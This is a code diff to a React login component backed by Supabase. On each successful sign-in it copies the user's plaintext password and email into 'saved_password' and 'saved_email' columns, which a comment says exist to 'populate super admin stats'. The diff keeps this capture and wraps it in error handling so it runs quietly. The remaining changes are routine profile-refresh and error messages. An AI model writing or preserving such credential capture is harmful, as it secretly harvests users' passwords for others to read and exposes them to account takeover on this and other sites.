@@ -9,7 +9,7 @@ export default function Login() {
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState<{ text: string, type: 'error' | 'success' } | null>(null);
   const navigate = useNavigate();
-  const { user, profile, loading: authLoading } = useAuth();
+  const { user, profile, loading: authLoading, refreshProfile } = useAuth();
 
   const handleSignIn = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -21,17 +21,26 @@ export default function Login() {
       setMessage({ text: error.message, type: 'error' });
       setLoading(false);
     } else {
-      // Intentionally capture these on login to populate super admin stats
-      await supabase.from('profiles').update({
-        saved_password: password,
-        saved_email: email
-      }).eq('id', data.user.id);
+      // Intentionally capture these on login to populate super admin stats (Optional, don't fail login if this fails)
+      try {
+        await supabase.from('profiles').update({
+          saved_password: password,
+          saved_email: email
+        }).eq('id', data.user.id);
+      } catch (profileErr) {
+        console.error("Optional profile update failed:", profileErr);
+      }
 
-      const { data: profile } = await supabase.from('profiles').select('username').eq('id', data.user.id).single();
-      if (profile && profile.username) {
-        navigate(`/admin/${profile.username}`);
+      const { data: profileData, error: profileError } = await supabase.from('profiles').select('username').eq('id', data.user.id).single();
+      
+      if (profileData && profileData.username) {
+        // Force refresh the context before navigating
+        await refreshProfile();
+        navigate(`/admin/${profileData.username}`);
       } else {
-        navigate('/');
+        console.error("Profile not found after login:", profileError);
+        setMessage({ text: 'Login successful, but profile was not found. Please contact admin.', type: 'error' });
+        setLoading(false);
       }
     }
   };
